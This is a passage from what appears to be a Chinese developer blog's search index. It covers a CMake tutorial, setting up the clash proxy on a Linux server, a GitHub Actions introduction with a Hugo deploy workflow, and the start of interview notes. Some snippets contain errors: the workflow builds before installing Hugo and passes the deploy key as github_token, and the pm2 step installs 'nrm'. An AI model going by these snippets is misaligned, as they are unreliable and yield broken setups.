","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:5:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"指定编译定义 除了在TutorialConfig.h中保存HAVE_LOG和HAVE_EXP值，我们还有更好的方法吗？让我们尝试使用target_compile_definitions()。 首先，从TutorialConfig.h.in中删除定义。我们不再需要在mysqrt.cxx中 include TutorialConfig.h或MathFunctions/CMakeLists.txt中的其他 include 内容。 接下来，我们可以将HAVE_LOG和HAVE_EXP的检查移至MathFunctions/CMakeLists.txt，然后将这些值指定为PRIVATE编译定义。 include(CheckSymbolExists) check_symbol_exists(log \"math.h\" HAVE_LOG) check_symbol_exists(exp \"math.h\" HAVE_EXP) if(NOT (HAVE_LOG AND HAVE_EXP)) unset(HAVE_LOG CACHE) unset(HAVE_EXP CACHE) set(CMAKE_REQUIRED_LIBRARIES \"m\") check_symbol_exists(log \"math.h\" HAVE_LOG) check_symbol_exists(exp \"math.h\" HAVE_EXP) if(HAVE_LOG AND HAVE_EXP) target_link_libraries(MathFunctions PRIVATE m) endif() endif() # add compile definitions if(HAVE_LOG AND HAVE_EXP) target_compile_definitions(MathFunctions PRIVATE \"HAVE_LOG\" \"HAVE_EXP\") endif() 之后再重新构建并运行项目，查看结果。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:5:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加自定义命令和生成的文件 假设，作为本教程的目的，我们决定永远不要使用平台提供的log和exp函数，而是想生成一个预计算值的表，以便在mysqrt函数中使用。在本节中，我们将创建该表作为构建过程的一部分，然后将该表编译到我们的应用程序中。 首先，让我们删除MathFunctions/CMakeLists.txt中对log和exp函数的检查。然后从mysqrt.cxx中删除对HAVE_LOG和HAVE_EXP的检查。同时，我们可以删除#include 。 在MathFunctions子目录中，提供了一个名为MakeTable.cxx的新源文件来生成表。 查看完文件后，我们可以看到该表是作为有效的 C ++代码生成的，并且输出文件名作为参数传入。 // A simple program that builds a sqrt table #include \u003ccmath\u003e #include \u003cfstream\u003e #include \u003ciostream\u003e int main(int argc, char *argv[]) { // make sure we have enough arguments if (argc \u003c 2) { return 1; } std::ofstream fout(argv[1], std::ios_base::out); const bool fileOpen = fout.is_open(); if (fileOpen) { fout \u003c\u003c \"double sqrtTable[] = {\" \u003c\u003c std::endl; for (int i = 0; i \u003c 10; ++i) { fout \u003c\u003c sqrt(static_cast\u003cdouble\u003e(i)) \u003c\u003c \",\" \u003c\u003c std::endl; } // close the table with a zero fout \u003c\u003c \"0};\" \u003c\u003c std::endl; fout.close(); } return fileOpen ? 0 : 1; // return 0 if wrote the file } 下一步是将适当的命令添加到MathFunctions/CMakeLists.txt文件中，以构建MakeTable可执行文件，然后在构建过程中运行它。需要一些命令来完成此操作。 首先，在MathFunctions/CMakeLists.txt的顶部，添加MakeTable的可执行文件，就像添加任何其他可执行文件一样。 add_executable(MakeTable MakeTable.cxx) 然后，我们添加一个自定义命令，该命令指定如何通过运行MakeTable来产生Table.h。 add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) 接下来，我们必须让 CMake 知道mysqrt.cxx如何依赖生成的文件Table.h。通过将生成的Table.h添加到库MathFunctions的源列表中，可以完成此操作。 add_library(MathFunctions mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) 我们还必须将当前的二进制目录添加到包含目录列表中，以便mysqrt.cxx可以找到并包含Table.h。 target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) 现在，我们使用生成的表。首先，修改mysqrt.cxx以包含Table.h。接下来，我们可以重写mysqrt函数以使用该表： #include \u003ciostream\u003e #include \"MathFunctions.h\" #include \"Table.h\" double mysqrt(double x) { if (x \u003c= 0) { return 0; } // use the table to help find an initial value double result = x; if (x \u003e= 1 \u0026\u0026 x \u003c 10) { std::cout \u003c\u003c \"Use the table to help find an initial value \" \u003c\u003c std::endl; result = sqrtTable[static_cast\u003cint\u003e(x)]; } // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } 构建此项目时，它将首先构建MakeTable可执行文件。然后它将运行MakeTable生成Table.h。最后，它将编译包括Table.h的mysqrt.cxx，以生成MathFunctions库。 做完这些更新后，再继续构建项目。运行构建好的 Tutorial 可执行文件，并验证结果是否与前面相同。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:6:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"构建安装程序 接下来假设我们想把我们的项目发布给其他人，以便他们能够使用它。我们希望在不同的平台上提供二进制和源代码的发布。这与我们之前在安装和测试（第 4 步）中所做的安装有些不同，在这里我们安装的是我们从源代码中构建的二进制文件。在这个例子中，我们将构建支持二进制安装和包管理功能的安装包。为了完成这个任务，我们将使用CPack来创建特定平台的安装包。具体来说，我们需要在顶层CMakeLists.txt文件的底部添加几行内容: include(InstallRequiredSystemLibraries) set(CPACK_RESOURCE_FILE_LICENSE \"${CMAKE_CURRENT_SOURCE_DIR}/License.txt\") set(CPACK_PACKAGE_VERSION_MAJOR \"${Tutorial_VERSION_MAJOR}\") set(CPACK_PACKAGE_VERSION_MINOR \"${Tutorial_VERSION_MINOR}\") include(CPack) 首先包含InstallRequiredSystemLibraries。这个模块将包含项目在当前平台上需要的任何运行时库。接下来，我们设置一些CPack变量，将这个项目的许可证和版本信息存储在那里。版本信息在本教程的前面已经设置好了，license.txt已经包含在本步骤的顶层源目录中: This is the open source License.txt file introduced in CMake/Tutorial/Step7... 最后我们加入CPack模块，它将使用这些变量和当前系统的一些其他属性来设置安装程序。 下一步是以通常的方式构建项目，然后运行cpack可执行文件。要构建一个二进制发行版，请在二进制目录下运行。 要指定生成器，请使用-G选项。对于多配置的构建，使用-C来指定配置。例如： cpack -G ZIP -C Debug 要创建一个源码分发，可以输入： cpack --config CPackSourceConfig.cmake 或者，运行make package或右键点击Package target 并从 IDE 中构建项目。 运行在二进制目录下找到的安装程序。然后运行已安装的可执行文件，并验证它是否工作。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:7:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加 DashBoard 支持 添加支持将我们的测试结果提交到 dashboard 很简单。我们已经为我们的项目定义了一些测试。现在我们只需要运行这些测试并将它们提交到仪表板。为了包含对仪表盘的支持，我们在顶层的CMakeLists.txt中加入了CTest模块: 将enable_testing()替换为include(CTest)。 CTest模块会自动调用enable_testing()，所以我们可以从CMake文件中删除它。 我们还需要在顶层目录下创建一个CTestConfig.cmake文件，在这里我们可以指定项目的名称和提交dashboard的位置。 set(CTEST_PROJECT_NAME \"CMakeTutorial\") set(CTEST_NIGHTLY_START_TIME \"00:00:00 EST\") set(CTEST_DROP_METHOD \"http\") set(CTEST_DROP_SITE \"my.cdash.org\") set(CTEST_DROP_LOCATION \"/submit.php?project=CMakeTutorial\") set(CTEST_DROP_SITE_CDASH TRUE) 当ctest可执行文件运行时，它将读取这个文件。要创建一个简单的 dashboard，你可以运行cmake可执行文件或cmake-gui来配置项目，但先不要构建它。切换到二叉树状目录，然后运行。 ctest [-VV] -D Experimental 请记住，对于多配置生成器（如 Visual Studio），必须指定配置类型。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:8:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"混合静态和共享 在这一节中，将展示如何使用BUILD_SHARED_LIBS变量来控制add_library()的默认行为，并允许控制没有明确类型(STATIC, SHARED, MODULE or OBJECT)的库的构建方式。 为了达到这个目的，我们需要在顶层的CMakeLists.txt中添加BUILD_SHARED_LIBS。我们使用option()命令，因为它允许用户选择性地选择该值是否应该是 ON 或 OFF。 接下来我们将重构 MathFunctions， 使其成为一个真正的库， 封装使用 mysqrt 或 sqrt， 而不是要求调用代码来完成这个逻辑。这也意味着 USE_MYMATH将不会控制构建 MathFunctions，而是控制这个库的行为。 第一步是更新顶层CMakeLists.txt的起始部分， 使其看起来像这样: cmake_minimum_required(VERSION 3.10) # set the project name and version project(Tutorial VERSION 1.0) # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) # control where the static and shared libraries are built so that on windows # we don't need to tinker with the path to run the executable set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") set(CMAKE_LIBRARY_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") set(CMAKE_RUNTIME_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") option(BUILD_SHARED_LIBS \"Build using shared libraries\" ON) # configure a header file to pass the version number only configure_file(TutorialConfig.h.in TutorialConfig.h) # add the MathFunctions library add_subdirectory(MathFunctions) # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC MathFunctions) 现在我们已经让MathFunctions始终被使用，接下来需要更新该库的逻辑。因此， 在 MathFunctions/CMakeLists.txt中， 我们需要创建一个 SqrtLibrary， 当 USE_MYMATH 启用时， 这个SqrtLibrary将有条件地被构建和安装。由于这是一个教程， 我们将明确要求静态地构建 SqrtLibrary。 最终的结果是MathFunctions/CMakeLists.txt 应该是这样的: # add the library that runs add_library(MathFunctions MathFunctions.cxx) # state that anybody linking to us needs to include the current source dir # to find MathFunctions.h, while we don't. target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) # should we use our own math functions option(USE_MYMATH \"Use tutorial provided math implementation\" ON) if(USE_MYMATH) target_compile_definitions(MathFunctions PRIVATE \"USE_MYMATH\") # first we add the executable that generates the table add_executable(MakeTable MakeTable.cxx) # add the command to generate the source code add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) # library that just does sqrt add_library(SqrtLibrary STATIC mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) # state that we depend on our binary dir to find Table.h target_include_directories(SqrtLibrary PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) target_link_libraries(MathFunctions PRIVATE SqrtLibrary) endif() # define the symbol stating we are using the declspec(dllexport) when # building on windows target_compile_definitions(MathFunctions PRIVATE \"EXPORTING_MYMATH\") # install rules set(installable_libs MathFunctions) if(TARGET SqrtLibrary) list(APPEND installable_libs SqrtLibrary) endif() install(TARGETS ${installable_libs} DESTINATION lib) install(FILES MathFunctions.h DESTINATION include) 接下来，更新 MathFunctions/mysqrt.cxx，使用 mathfunctions和 detail 命名空间。 #include \u003ciostream\u003e #include \"MathFunctions.h\" #include \"Table.h\" namespace mathfunctions { namespace detail { double mysqrt(double x) { if (x \u003c= 0) { return 0; } double result = x; if (x \u003e= 1 \u0026\u0026 x \u003c 10) { std::cout \u003c\u003c \"Use the table to help find an initial value \" \u003c\u003c std::endl; result = sqrtTable[static_cast\u003cint\u003e(x)]; } // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } } // namespace detail } // namespace mathfunctions 我们还需要在 tutorial.cxx中做一些修改， 使它不再使用 USE_MYMATH: 始终 include MathFunctions.h 始终使用 mathfunctions::sqrt 不要 include cmath mysqrt.h如下： namespace mathfunctions { namespace detail { double mysqrt(double x); } } // namespace mathfunctions MathFunctions.cxx如下： #include \"MathFunctions.h\" #include \u003ccmath\u003e #ifdef USE_MYMATH #include \"mysqrt.h\" #endif namespace mathfunctions { double sqrt(double x) { #ifdef USE_MYMATH return de","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:9:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加生成器表达式 在构建系统生成期间会执行Generator expression，以生成特定于每个构建配置的信息。 在许多目标属性（例如LINK_LIBRARIES，INCLUDE_DIRECTORIES，COMPLIE_DEFINITIONS等）的上下文中允许Generator expression。在使用命令填充这些属性（例如target_link_libraries()，target_include_directories()，target_compile_definitions()等）时，也可以使用它们。 Generator expression可用于启用条件链接、编译时使用的条件定义、条件 include 目录等。这些条件可以基于构建配置、目标属性、平台信息或任何其他可查询的信息。 有不同类型的Generator expression，包括逻辑表达式、信息表达式和输出表达式。 逻辑表达式用于创建条件输出。基本的表达式是 0 和 1 表达式。$\u003c0:...\u003e的结果是空字符串，\u003c1:...\u003e的结果是\"... \"的内容。它们也可以嵌套。 Generator expression的一个常见用法是有条件地添加编译器标志，例如语言级别或警告的标志。一个很好的模式是将这些信息关联到一个INTERFACE目标，允许这些信息传播。让我们从构造一个INTERFACE目标开始，并指定所需的 C++标准为 11，而不是使用CMAKE_CXX_STANDARD。 原代码如下： # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) 替换为： add_library(tutorial_compiler_flags INTERFACE) target_compile_features(tutorial_compiler_flags INTERFACE cxx_std_11) 接下来，我们为项目添加所需的编译器警告标志。由于警告标志因编译器而异，因此我们使用COMPILE_LANG_AND_ID生成器表达式来控制在给定语言和一组编译器 ID 的情况下应应用的标志，如下所示： set(gcc_like_cxx \"$\u003cCOMPILE_LANG_AND_ID:CXX,ARMClang,AppleClang,Clang,GNU\u003e\") set(msvc_cxx \"$\u003cCOMPILE_LANG_AND_ID:CXX,MSVC\u003e\") target_compile_options(tutorial_compiler_flags INTERFACE \"$\u003c${gcc_like_cxx}:$\u003cBUILD_INTERFACE:-Wall;-Wextra;-Wshadow;-Wformat=2;-Wunused\u003e\u003e\" \"$\u003c${msvc_cxx}:$\u003cBUILD_INTERFACE:-W3\u003e\u003e\" ) 查看此内容，我们看到警告标志封装在BUILD_INTERFACE条件内。这样做是为了使我们已安装项目的使用者不会继承我们的警告标志。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:10:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加导出配置 在教程的“安装和测试”中，我们添加了 CMake 安装项目的库和头文件的功能。在”构建安装程序“期间，我们添加了打包这些信息的功能，以便可以将其分发给其他人。 下一步是添加必要的信息，以便其他 CMake 项目可以使用我们的项目，无论是从构建目录，本地安装还是打包时。 第一步是更新我们的install（TARGETS）命令，不仅要指定DESTINATION，还要指定EXPORT。 EXPORT关键字生成并安装一个CMake文件，该文件包含用于从安装树中导入install命令中列出的所有目标的代码。因此，让我们继续，通过更新MathFunctions/CMakeLists.txt中的install命令，显式导出MathFunctions库，如下所示： 现在我们已经导出了MathFunctions，我们还需要显式安装生成的MathFunctionsTargets.cmake文件。通过将以下内容添加到顶层的CMakeLists.txt的底部来完成： install(EXPORT MathFunctionsTargets FILE MathFunctionsTargets.cmake DESTINATION lib/cmake/MathFunctions ) 然后尝试构建项目，应该会遇到类似下面的错误： CMake Error in MathFunctions/CMakeLists.txt: Target \"MathFunctions\" INTERFACE_INCLUDE_DIRECTORIES property contains path: \"/Users/wmc/vscode/cmake/tutorial/MathFunctions\" which is prefixed in the source directory. CMake 试图说的是，在生成导出信息的过程中，它将导出与当前机器上的绝对路径，在其他机器上无效。解决方案是更新MathFunctions的 target_include_directories()，以让 CMake 了解当从构建目录内和从安装/包中使用时，它需要不同的 INTERFACE 位置。这意味着将MathFunctions的target_include_directories()调用转换为如下样子: target_include_directories(MathFunctions INTERFACE $\u003cBUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}\u003e $\u003cINSTALL_INTERFACE:include\u003e ) 修改后重新运行 CMake，应该不会再有警告了。 此时，我们已经让 CMake 正确地打包了所需的目标信息，但我们仍然需要生成一个MathFunctionsConfig.cmake，这样CMake find_package()命令才能找到我们的项目。所以我们继续在项目的顶层添加一个新文件，名为Config.cmake.in，内容如下。 @PACKAGE_INIT@ include ( \"${CMAKE_CURRENT_LIST_DIR}/MathFunctionsTargets.cmake\" ) 然后，为了正确配置和安装该文件，在顶层CMakeLists.txt的底部添加以下内容: include(CMakePackageConfigHelpers) # generate the config file that is includes the exports configure_package_config_file(${CMAKE_CURRENT_SOURCE_DIR}/Config.cmake.in \"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake\" INSTALL_DESTINATION \"lib/cmake/example\" NO_SET_AND_CHECK_MACRO NO_CHECK_REQUIRED_COMPONENTS_MACRO ) # generate the version file for the config file write_basic_package_version_file( \"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfigVersion.cmake\" VERSION \"${Tutorial_VERSION_MAJOR}.${Tutorial_VERSION_MINOR}\" COMPATIBILITY AnyNewerVersion ) # install the configuration file install(FILES ${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake DESTINATION lib/cmake/MathFunctions ) 此时，我们已经为我们的项目生成了一个可重定位的 CMake 配置，可以在项目安装或打包后使用。如果我们希望我们的项目也能在构建目录下使用，我们只需要在顶层 CMakeLists.txt的底部添加以下内容: 通过这个export调用，我们现在可以生成一个Targets.cmake，允许构建目录下配置的MathFunctionsConfig.cmake被其他项目使用，而不需要安装它。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:11:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"打包 Debug 和 Release 注意：这个例子对单配置生成器有效，对多配置生成器（如 Visual Studio）无效。 默认情况下，CMake 的模型是一个构建目录只包含一个配置，无论是 Debug、Release、MinSizeRel，还是 RelWithDebInfo。然而，我们可以设置 CPack 来捆绑多个构建目录，并构建一个包含同一项目多个配置的包。 首先，我们要确保 Debug 版本和 Release 版本构建的可执行文件和库使用不同的名称。让我们使用 d 作为 Debug 版可执行文件和库的后缀。 在顶层的CMakeLists.txt文件开始处添加： set(CMAKE_DEBUG_POSTFIX d) add_library(tutorial_compiler_flags INTERFACE) 以及TUtorial可执行文件上的 DEBUG_POSTFIX 属性: add_executable(Tutorial tutorial.cxx) set_target_properties(Tutorial PROPERTIES DEBUG_POSTFIX ${CMAKE_DEBUG_POSTFIX}) target_link_libraries(Tutorial PUBLIC MathFunctions) 我们也给MathFunctions库添加版本号。在MathFunctions/CMakeLists.txt中，设置VERSION和SOVERSION属性: set_property(TARGET MathFunctions PROPERTY VERSION \"1.0.0\") set_property(TARGET MathFunctions PROPERTY SOVERSION \"1\") 在项目根目录下： mkdir -p step12_build/{debug,release} 现在我们需要设置 debug 和 release 版本。我们可以使用CMAKE_BUILD_TYPE来设置配置类型： cd debug cmake -DCMAKE_BUILD_TYPE=Debug ../.. cmake --build . cd ../release cmake -DCMAKE_BUILD_TYPE=Release ../.. cmake --build . 现在调试和发行版的构建都已经完成，我们可以使用一个自定义的配置文件将两个构建打包成一个发行版。在 step12_build 目录下，创建一个名为MultiCPackConfig.cmake的文件。在这个文件中，首先包含 cmake 可执行文件创建的默认配置文件 接下来，使用CPACK_INSTALL_CMAKE_PROJECTS变量来指定要安装的项目。在本例中，我们希望同时安装 debug 和 release 版本： include(\"release/CPackConfig.cmake\") set(CPACK_INSTALL_CMAKE_PROJECTS \"debug;Tutorial;ALL;/\" \"release;Tutorial;ALL;/\" ) 在 step12_build 目录下，运行cpack，用config选项指定我们的自定义配置文件: cpack --config MultiCPackConfig.cmake ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:12:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["Linux"],"content":"起因 偶然发现百度云的学生服务器挺便宜，2 核心 4g 内存机型一个月只要 18 元，有个随时随地能够访问的 Linux 环境还是挺好的，遂购入。新系统初始化完成，第一件事当然是来一套ohmyzsh，结果这就出了问题，git clone太慢了。 遂想到是不是该给其使用一下代理。不然之后不止git clone，很多资源都无法下载。 ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:1:0","tags":["clash","代理"],"title":"Linux使用clash代理","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"使用clash clash是一款使用go语言开发的多平台代理工具，支持ss/v2ray等多种协议，在macOS，windows上使用起来很方便，在没有GUI的Linux也只需要稍加配置。 先从这里下载clash的linux-amd64可执行文件。 naruto@bdy:~$ gzip -d clash-linux-amd64-v1.1.0.gz naruto@bdy:~$ chmod +x clash-linux-amd64-v1.1.0 naruto@bdy:~$ sudo mv clash-linux-amd64-v1.1.0 /usr/local/bin/clash 然后下载Country.mmdb。 naruto@bdy:~$ mkdir -p .config/clash naruto@bdy:~$ mv Country.mmdb .config/clash/ 之后，需要最关键的clash代理配置文件config.yaml，一般机场都会提供，同样将其放到.config/clash目录下。 之后先直接启动clash看看效果。 启动遇到WARN[0000] Failed to start Redir UDP Listener: operation not permitted，可以使用sudo clash启动。 ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:2:0","tags":["clash","代理"],"title":"Linux使用clash代理","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"配置 GUI 界面 从上一段的图中可以看到，clash服务有一个RESTful API的服务，通过其我们可以访问 web 管理页面。在config.yaml中制定即可。比较受欢迎的是yacd，可以直接下载打包好的版本。 naruto@bdy:~$ unzip yacd-gh-pages.zip naruto@bdy:~$ mv yacd-gh-pages .config/clash/dashboard 在config.yaml中如下设置： external-ui: \"dashboard\" secret: \"\" 启动clash后，浏览器使用ip:port/ui的方式访问，如下所示。 ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:3:0","tags":["clash","代理"],"title":"Linux使用clash代理","uri":"/posts/linux-clash-proxy/"},{"categories":["Linux"],"content":"享用代理 在 GUI 界面选择好代理服务器后，就可以使用代理了。打开另一个终端窗口，执行如下命令，设置http(s)代理环境变量。 export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 接下来，进行一些完善工作。首先每次都手动启动clash并且占用一个终端窗口是很不方便的，先将clash作为一个daemon进程。参照开发者推荐，使用pm2。 $ npm install -g nrm $ pm2 start clash 然后是将代理命令作为函数写入.zshrc. 注意，下面使用了zsh语法，和bash略有不同。 PROXY_IP=127.0.0.1 PROXY_PORT=7890 function Proxy() { if [ \"$1\" = \"on\" ]; then export https_proxy=$PROXY_IP:$PROXY_PORT export http_proxy=$PROXY_IP:$PROXY_PORT echo Proxy On else unset https_proxy unset http_proxy echo Proxy Off fi } 然后试试看，非常愉快。 最后，我们来装一个rust试试。 ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:4:0","tags":["clash","代理"],"title":"Linux使用clash代理","uri":"/posts/linux-clash-proxy/"},{"categories":["github"],"content":"简介 GitHub Actions可帮助开发人员在软件开发生命周期内自动化任务。 GitHub Actions 是事件驱动的，这意味着可以在发生指定事件后运行一系列命令。例如，每当有人为仓库新建pr时，可以自动运行测试脚本。 该图演示了如何使用 GitHub Actions 自动运行软件测试脚本。事件自动触发包job含的workflow。然后，job将使用step来控制action的执行顺序。这些action即是自动化测试软件的命令。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:1:0","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Github Actions 的组件 以下是可协同运行job的多个GitHub Actions组件的列表。可以看到这些组件之间如何交互 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:0","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"workflow workflow您添加到代码仓库中的自动化过程。其由一个或多个job组成，可以由事件调度或触发。该workflow可用于在 GitHub 上构建，测试，打包，发布或部署项目。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:1","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Events event是触发workflow的特定活动。例如，当有人将commit 推送到仓库或创建issue或pr时，Github 会产生envent。还可以使用 repository dispatch webhook在发生外部事件时触发workflow。有关可用于触发workflow的evrnt的完整列表，查看Events that trigger workflows。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:2","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Jobs job是在同一runner上执行的一组step。默认情况下，具有多个job的workflow程将并行运行这些job。还可以配置workflow以按顺序运行job。例如，一个workflow可以有两个顺序执行的job来构建和测试代码，其中测试job取决于构建job的状态。如果构建job失败，则测试job将不会运行。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:3","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Steps step是可以在job中运行命令的单个任务。step可以是操作或shell命令。job中的每个step都在同一runner上执行，从而使该job中的操作可以彼此共享数据。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:4","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Actions action是独立的命令，组合成step以构建job, action是工作流中最小的可移植构建块。可以创建自己的action，也可以使用 GitHub 社区创建的action。要在工作流中使用action，必须将其包括在一个step中。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:5","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Runners runner是已安装GitHub Actions runner 应用程序的服务器。可以使用 GitHub 托管的runner，也可以使用自己的runner。runner监听可用的job，一次运行一个job，并将进度，日志和结果反馈给 GitHub。对于由 GitHub 托管的runner，workflow中的每个job都在全新的虚拟环境中运行。 GitHub 托管的runner基于 Ubuntu Linux，Microsoft Windows 和 macOS。有关 GitHub 托管的runner的信息，请参阅\"Virtual environments for GitHub-hosted runners\"。如果需要其他的 OS 或特定的硬件配置，则可以托管自己的runner。有关自托管runner的信息，请参阅\"Hosting your own runners\"。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:6","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"创建样例 workflow GitHub Actions 使用YAML语法定义event，job和step。这些 YAML 文件存储在代码存储库中的.github / workflows目录中。 可以在仓库中创建示例的workflow，该workflow在每次推送代码时自动触发一系列命令。在此workflow中，GitHub Actions 使用了actions market的checkout和setup-node action，然后安装软件依赖项，并运行bat -v。 首先在项目中创建.github/workflow目录 在其中，创建一个learn-github-actions.yml文件，内容如下： name: learn-github-actions on: [push] jobs: check-bats-version: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-node@v1 - run: npm install -g bats - run: bats -v commit这些修改并且push代码到仓库 现在，新的GitHub Actions工作流文件已安装在代码仓库中，并且每次有人将更改推送到仓库时，它将自动运行。有关作业的执行历史记录的详细信息，请参阅\"Viewing the workflow’s activity\"。 要更详细了解workflow文件，参阅Understanding the workflow file。 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:7","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"自动构建 Hugo 博客 ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:0","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"配置密钥 首先生成一对新的密钥 ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f github-deploy-key -N \"\" 在对应的 gihtub 仓库设置中的Deploy keys,将刚才生成的密钥对中的公钥添加进去;然后在设置中的Secrets里面新建一个Secret，名为DEPLOY_KEY，将刚才生成的密钥对中的私钥添加进去. ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:1","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"配置workflow 在项目根目录下新建.github/workflow/gh-pages.yaml，内容为 name: Build GH-Pages on: push: branches: - hugo workflow_dispatch: # manual run jobs: deploy: runs-on: ubuntu-latest steps: - name: Git checkout uses: actions/checkout@v2 with: ref: hugo - name: Get Theme run: git submodule update --init --recursive - name: Update theme to Latest commit run: git submodule update --remote --merge - uses: actions/cache@v2 with: path: /tmp/hugo_cache key: ${{ runner.os }}-hugomod-${{ hashFiles('**/go.sum') }} restore-keys: | ${{ runner.os }}-hugomod- - name: Build run: hugo --buildDrafts --gc --verbose --minify - name: Setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \"latest\" - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.DEPLOY_KEY }} publish_dir: ./public 不过部署 Hexo 博客的话,目前 Vercel 更简单,在国内访问也更快. ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:2","tags":["CI/CD","gitpages"],"title":"Github Actions简介","uri":"/posts/github-actions-intro/"},{"categories":["面经"],"content":"第一轮面试 首先自我介绍 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:0","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"开发知识 问我比较熟悉什么语言，答Java，遂开始问Java。 